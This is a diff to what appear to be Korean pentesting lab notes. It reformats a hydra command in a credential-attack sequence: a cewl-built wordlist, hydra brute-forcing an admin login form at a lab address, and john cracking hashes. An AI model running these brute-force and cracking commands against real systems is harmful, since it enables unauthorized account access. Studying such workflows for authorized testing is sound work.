@@ -35,8 +35,7 @@
 cewl -d 3 -m 6 -w corp_words.txt http://10.10.10.10
 
 # 2. 생성한 사전을 hydra 로그인 브루트포스에 투입
-hydra -l admin -P corp_words.txt 10.10.10.10 http-post-form \
-  "/login:user=^USER^&pass=^PASS^:F=incorrect"
+hydra -l admin -P corp_words.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
 
 # 3. 해시를 얻었으면 cracking 폴더로
 john --wordlist=corp_words.txt hash.txt
